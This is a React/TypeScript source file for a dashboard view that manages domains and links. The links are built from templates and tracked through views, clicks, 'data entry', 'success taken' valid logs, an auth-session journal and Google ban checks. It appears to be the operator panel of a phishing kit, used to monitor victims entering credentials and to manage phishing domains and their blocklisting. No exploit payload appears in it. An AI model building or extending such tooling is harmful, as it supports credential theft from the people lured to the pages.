import { useEffect, useState, type ReactNode } from "react";
import {
  Apple,
  AppWindow,
  Check,
  Copy,
  Eye,
  Ghost,
  Globe2,
  Link2,
  List,
  LogIn,
  MousePointer2,
  Pause,
  Pencil,
  Plus,
  RefreshCw,
  Search,
  Smartphone,
  Trash2,
  UserPlus,
} from "lucide-react";
import { sitesText } from "../../sitesCopy";
import type {
  AuthJournalSession,
  CountRow,
  CountryRow,
  LinkPayload,
  SiteDomain,
  SiteLink,
  SiteTemplate,
} from "../../sitesTypes";
import {
  formatShortDateTime,
  linkDisplayUrl,
  linkPathLabel,
  safeSiteStats,
  scaleCountries,
  scaleDevices,
  windowTypeLabel,
} from "../../sitesUtils";
import { CountryFlag } from "../CountryFlag";
import { AuthJournalDialog } from "./AuthJournalDialog";
import { ConfirmDialog } from "./ConfirmDialog";
import { KebabMenu, closeExclusiveMenus } from "./KebabMenu";
import { LinkFormDialog } from "./LinkFormDialog";

function hostUrl(domain: string) {
  return `https://${String(domain || "").replace(/^https?:\/\//, "")}`;
}

function DeviceIcon({ name }: { name: string }) {
  const key = name.toLowerCase();
  if (key.includes("apple") || key.includes("ios") || key.includes("mac")) {
    return <Apple size={14} aria-hidden="true" />;
  }
  if (key.includes("android")) return <Smartphone size={14} aria-hidden="true" />;
  if (key.includes("win")) return <AppWindow size={14} aria-hidden="true" />;
  return <Ghost size={14} aria-hidden="true" />;
}

function StatsTip({
  title,
  countries,
  devices,
  desktopPercent,
}: {
  title: string;
  countries?: CountryRow[];
  devices?: CountRow[];
  desktopPercent?: number | null;
}) {
  const hasCountries = Boolean(countries?.length);
  const hasDevices = Boolean(devices?.length);
  if (!hasCountries && !hasDevices) {
    return (
      <div className="gbs-stats-tip" role="tooltip">
        <strong>{title}</strong>
        <p className="gbs-stats-tip__empty">{sitesText("statsNoBreakdown")}</p>
      </div>
    );
  }

  const pcValue =
    desktopPercent == null || !Number.isFinite(desktopPercent)
      ? null
      : Number(desktopPercent).toFixed(2);

  return (
    <div className="gbs-stats-tip" role="tooltip">
      <strong>{title}</strong>
      {hasCountries ? (
        <div className="gbs-stats-tip__flags">
          {countries!.slice(0, 15).map((row) => (
            <span key={row.code}>
              <span className="gbs-stats-tip__flag">
                {["UN", "CIS", "XX"].includes(String(row.code || "").toUpperCase()) ? (
                  <Globe2 size={14} aria-hidden="true" />
                ) : (
                  <CountryFlag code={row.code} />
                )}
              </span>
              <em>{row.count}</em>
            </span>
          ))}
        </div>
      ) : null}
      {hasDevices ? (
        <div className="gbs-stats-tip__devices">
          {devices!.slice(0, 4).map((row) => (
            <span key={row.name}>
              <DeviceIcon name={row.name} />
              <em>{row.count}</em>
            </span>
          ))}
        </div>
      ) : null}
      {pcValue != null ? <p>{sitesText("statsPcShare", { value: pcValue })}</p> : null}
    </div>
  );
}

type MetricKey = "views" | "clicks" | "auths" | "logs";

function MetricStat({
  metric,
  value,
  icon,
  label,
  countries,
  devices,
  desktopPercent,
}: {
  metric: MetricKey;
  value: number;
  icon: ReactNode;
  label: string;
  countries?: CountryRow[];
  devices?: CountRow[];
  desktopPercent?: number | null;
}) {
  const scaledCountries = scaleCountries(countries, value);
  const scaledDevices = scaleDevices(devices, value);
  const titleKey =
    metric === "views"
      ? "statsSiteVisits"
      : metric === "clicks"
        ? "statsAuthVisits"
        : metric === "auths"
          ? "statsDataEntry"
          : "statsSuccessTaken";

  return (
    <span className="gbs-metric" tabIndex={0} aria-label={`${label}: ${value}`}>
      {icon}
      <b>{value}</b>
      <StatsTip
        title={sitesText(titleKey)}
        countries={scaledCountries}
        devices={scaledDevices}
        desktopPercent={desktopPercent}
      />
    </span>
  );
}

function LinkRowView({
  link,
  domainName,
  domainPaused,
  onEdit,
  onDelete,
  onJournal,
  onReset,
}: {
  link: SiteLink;
  domainName: string;
  domainPaused: boolean;
  onEdit(): void;
  onDelete(): void;
  onJournal(): void;
  onReset(): void;
}) {
  const url = linkDisplayUrl(link, domainName);
  const path = linkPathLabel(link);
  const stats = safeSiteStats(link);
  const paused = domainPaused || Boolean(link.isPaused);

  return (
    <article className="gbs-link">
      <div className="gbs-link__main">
        <a href={url} target="_blank" rel="noopener noreferrer" title={url}>
          {path}
        </a>
        <div className="gbs-link__badges">
          {link.id ? <span className="gbs-flag">{link.id}</span> : null}
          {link.templateName || link.template ? (
            <span className="gbs-flag">{link.templateName || link.template}</span>
          ) : null}
          <span className={`gbs-flag ${paused ? "gbs-flag--warn" : "is-live"}`}>
            {paused ? sitesText("linkPaused") : sitesText("linkActive")}
          </span>
        </div>
      </div>
      <div className="gbs-link__auth">
        <span>{windowTypeLabel(link.windowType)}</span>
        {link.iframe ? (
          <span className="gbs-flag is-live">{sitesText("badgeIframe")}</span>
        ) : null}
      </div>
      <div className="gbs-link__metrics">
        <MetricStat
          metric="views"
          value={stats.views}
          label={sitesText("views")}
          icon={<Eye size={14} aria-hidden="true" />}
          countries={link.countries}
          devices={link.devices}
          desktopPercent={stats.desktopPercent}
        />
        <MetricStat
          metric="clicks"
          value={stats.clicks}
          label={sitesText("clicks")}
          icon={<MousePointer2 size={14} aria-hidden="true" />}
          countries={link.countries}
          devices={link.devices}
          desktopPercent={stats.desktopPercent}
        />
        <MetricStat
          metric="auths"
          value={stats.auths}
          label={sitesText("auths")}
          icon={<LogIn size={14} aria-hidden="true" />}
          countries={link.countries}
          devices={link.devices}
          desktopPercent={stats.desktopPercent}
        />
        <MetricStat
          metric="logs"
          value={stats.logs}
          label={sitesText("validLogs")}
          icon={<Check size={14} aria-hidden="true" />}
          countries={link.countries}
          devices={link.devices}
          desktopPercent={stats.desktopPercent}
        />
      </div>
      <KebabMenu
        label={sitesText("linkMenu")}
        items={[
          {
            id: "copy",
            label: sitesText("copyLink"),
            icon: <Copy size={14} />,
            onSelect: () => {
              navigator.clipboard.writeText(url).then(
                () => window.WorkerToast?.success?.(sitesText("copied")),
                () => window.WorkerToast?.error?.(sitesText("copyFailed")),
              );
            },
          },
          {
            id: "edit",
            label: sitesText("actionEdit"),
            icon: <Pencil size={14} />,
            hidden: domainPaused,
            onSelect: onEdit,
          },
          {
            id: "journal",
            label: sitesText("authHistory"),
            icon: <List size={14} />,
            onSelect: onJournal,
          },
          {
            id: "reset",
            label: sitesText("resetStats"),
            icon: <RefreshCw size={14} />,
            separatorBefore: true,
            onSelect: onReset,
          },
          {
            id: "delete",
            label: sitesText("actionDelete"),
            icon: <Trash2 size={14} />,
            danger: true,
            onSelect: onDelete,
          },
        ]}
      />
    </article>
  );
}

export function shareDomainUrl(domain: string) {
  return hostUrl(domain);
}

export function SiteDetail({
  domain,
  links,
  templates,
  deletingDomain,
  linkFormOpen,
  linkFormMode,
  editingLink,
  confirmDeleteDomain,
  confirmDeleteLink,
  journalSessions,
  journalLoading,
  onBack,
  onShare,
  onPause,
  onDeleteDomain,
  onCreateLink,
  onEditLink,
  onDeleteLink,
  onOpenJournal,
  onResetStats,
  onCloseLinkForm,
  onSubmitLink,
  onCloseDeleteDomain,
  onCloseDeleteLink,
  onConfirmDeleteDomain,
  onConfirmDeleteLink,
  onCloseJournal,
}: {
  domain: SiteDomain;
  links: SiteLink[];
  templates: SiteTemplate[];
  deletingDomain?: boolean;
  linkFormOpen: boolean;
  linkFormMode: "create" | "edit";
  editingLink: SiteLink | null;
  confirmDeleteDomain: boolean;
  confirmDeleteLink: SiteLink | null;
  journalSessions: AuthJournalSession[];
  journalLoading?: boolean;
  onBack(): void;
  onShare(): void;
  onPause(): void;
  onDeleteDomain(): void;
  onCreateLink(): void;
  onEditLink(link: SiteLink): void;
  onDeleteLink(link: SiteLink): void;
  onOpenJournal(link: SiteLink, background?: boolean): void;
  onResetStats(link: SiteLink): void;
  onCloseLinkForm(): void;
  onSubmitLink(payload: LinkPayload): Promise<void>;
  onCloseDeleteDomain(): void;
  onCloseDeleteLink(): void;
  onConfirmDeleteDomain(): void;
  onConfirmDeleteLink(): void;
  onCloseJournal(): void;
}) {
  const domainPaused = Boolean(domain.isPaused);
  const google = domain.banChecks?.google;
  const googleBad = google?.banned === true;
  const googleOk = google?.clean === true || google?.banned === false;
  const [journalLink, setJournalLink] = useState<SiteLink | null>(null);
  const [resetLink, setResetLink] = useState<SiteLink | null>(null);
  const [linkQuery, setLinkQuery] = useState("");

  useEffect(() => {
    closeExclusiveMenus();
    setLinkQuery("");
  }, [domain.id]);

  const linkQueryTrimmed = linkQuery.trim().toLowerCase();
  const visibleLinks = linkQueryTrimmed
    ? links.filter((link) => {
        const haystack = [
          linkPathLabel(link),
          linkDisplayUrl(link, domain.domain),
          link.templateName,
          link.template,
        ]
          .filter(Boolean)
          .join(" ")
          .toLowerCase();
        return haystack.includes(linkQueryTrimmed);
      })
    : links;

  return (
    <div className="gbs-host">
      <nav className="gbs-crumb" aria-label={sitesText("breadcrumbSites")}>
        <button type="button" onClick={onBack}>
          {sitesText("breadcrumbSites")}
        </button>
        <span aria-hidden="true">›</span>
        <strong>{domain.domain}</strong>
      </nav>

      <header className="gbs-host__hero">
        <div className="gbs-host__identity">
          <h1>
            <Globe2 size={22} aria-hidden="true" />
            {domain.domain}
            <span
              className={`gbs-mark${googleBad ? " is-bad" : googleOk ? " is-ok" : ""}`}
              title="Google"
            >
              <span className="gbs-mark__g">G</span>
            </span>
          </h1>
          <div className="gbs-host__status">
            <span className={`gbs-live${domainPaused ? " is-off" : ""}`}>
              <i aria-hidden="true" />
              {sitesText("visitorsOnline", { count: domain.online || 0 })}
            </span>
            <span>
              {sitesText("domainAdded", {
                date: formatShortDateTime(domain.createdAt),
              })}
            </span>
            <span>{sitesText("linksMeta", { count: links.length })}</span>
          </div>
        </div>
      </header>

      <div className="gbs-host__bar">
        {domain.isOwn ? (
          <KebabMenu
            label={sitesText("domainMenu")}
            items={[
              {
                id: "delete",
                label: sitesText("deleteDomain"),
                icon: <Trash2 size={14} />,
                danger: true,
                onSelect: onDeleteDomain,
              },
            ]}
          />
        ) : null}
        {!domainPaused ? (
          <button type="button" className="gbd-button gbd-button--primary" onClick={onCreateLink}>
            <Plus size={15} aria-hidden="true" />
            {sitesText("addLink")}
          </button>
        ) : null}
        <button type="button" className="gbd-button" onClick={onShare}>
          <UserPlus size={15} aria-hidden="true" />
          {sitesText("shareDomain")}
        </button>
        <button type="button" className="gbd-button" onClick={onPause}>
          <Pause size={15} aria-hidden="true" />
          {domainPaused ? sitesText("resumeDomain") : sitesText("pauseDomain")}
        </button>
        {domain.isOwn ? (
          <button
            type="button"
            className="gbd-button gbs-button--danger"
            disabled={deletingDomain}
            onClick={onDeleteDomain}
          >
            <Trash2 size={15} aria-hidden="true" />
            {sitesText("deleteDomain")}
          </button>
        ) : null}
      </div>

      <section className="gbs-links-block">
        <div className="gbs-links-block__head">
          <h2>
            <Link2 size={16} aria-hidden="true" />
            {sitesText("linksOnDomain")}
          </h2>
          <p>{sitesText("linksJournalHint")}</p>
        </div>

        {links.length === 0 ? (
          <div className="gbs-host-empty">
            <div className="gbs-host-empty__icon" aria-hidden="true">
              <Link2 size={18} />
            </div>
            <strong>{sitesText("linksEmptyTitle")}</strong>
            <span>
              {domainPaused ? sitesText("linksPausedHint") : sitesText("linksEmptyHint")}
            </span>
          </div>
        ) : (
          <div className="gbs-links-list">
            {links.length > 4 ? (
              <label className="gbs-search">
                <Search size={16} aria-hidden="true" />
                <input
                  type="search"
                  value={linkQuery}
                  placeholder={sitesText("searchLinks")}
                  autoComplete="off"
                  onChange={(event) => setLinkQuery(event.target.value)}
                />
              </label>
            ) : null}
            {visibleLinks.length === 0 ? (
              <div className="gbs-host-empty">
                <div className="gbs-host-empty__icon" aria-hidden="true">
                  <Search size={18} />
                </div>
                <strong>{sitesText("linksFilteredEmpty")}</strong>
              </div>
            ) : (
              <>
                <div className="gbs-links-list__cols">
                  <span>{sitesText("colLink")}</span>
                  <span>{sitesText("colAuthType")}</span>
                </div>
                {visibleLinks.map((link) => (
                  <LinkRowView
                    key={link.id}
                    link={link}
                    domainName={domain.domain}
                    domainPaused={domainPaused}
                    onEdit={() => onEditLink(link)}
                    onDelete={() => onDeleteLink(link)}
                    onJournal={() => {
                      setJournalLink(link);
                      onOpenJournal(link);
                    }}
                    onReset={() => setResetLink(link)}
                  />
                ))}
              </>
            )}
          </div>
        )}
      </section>

      <LinkFormDialog
        open={linkFormOpen}
        mode={linkFormMode}
        link={editingLink}
        templates={templates}
        onClose={onCloseLinkForm}
        onSubmit={onSubmitLink}
      />

      <AuthJournalDialog
        open={Boolean(journalLink)}
        link={journalLink}
        sessions={journalSessions}
        loading={journalLoading}
        onRefresh={(link) => onOpenJournal(link, true)}
        onClose={() => {
          setJournalLink(null);
          onCloseJournal();
        }}
      />

      <ConfirmDialog
        open={Boolean(resetLink)}
        title={sitesText("resetStats")}
        message={sitesText("resetStatsConfirm")}
        confirmLabel={sitesText("resetStats")}
        danger={false}
        onCancel={() => setResetLink(null)}
        onConfirm={() => {
          if (resetLink) onResetStats(resetLink);
          setResetLink(null);
        }}
      />

      <ConfirmDialog
        open={confirmDeleteDomain}
        title={sitesText("confirmTitle")}
        message={sitesText("deleteConfirm", { domain: domain.domain })}
        confirmLabel={sitesText("deleteDomain")}
        onCancel={onCloseDeleteDomain}
        onConfirm={onConfirmDeleteDomain}
      />

      <ConfirmDialog
        open={Boolean(confirmDeleteLink)}
        title={sitesText("deleteLinkTitle")}
        message={sitesText("deleteLinkConfirm")}
        onCancel={onCloseDeleteLink}
        onConfirm={onConfirmDeleteLink}
      />
    </div>
  );
}
